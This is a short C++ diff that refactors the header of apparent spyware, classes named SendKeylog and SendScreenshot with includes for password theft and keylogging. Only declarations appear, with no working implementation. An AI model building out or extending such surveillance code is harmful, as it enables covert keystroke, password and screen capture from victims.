@@ -3,7 +3,7 @@
 #include <common/Innocence.hpp>
 #include <log/Log.hpp>
 #include <malicious/Passwords.hpp>
-#include <malicious/Keylogger.hpp>
+#include <keyboard/KeyLogObserver.hpp>
 #include <malicious/Screenshot.hpp>
 #include "SlaveAbstractFunction.hpp"
 
@@ -69,7 +69,10 @@ namespace Inhibition
     class SendKeylog : public SlaveAbstractFunction
     {
         public:
+			SendKeylog(Keyboard::KeyLogObserver * keyLogObserverArg);
             virtual void operator()();
+		private:
+			Keyboard::KeyLogObserver * keyLogObserver;
     };
 
     class SendScreenshot : public SlaveAbstractFunction
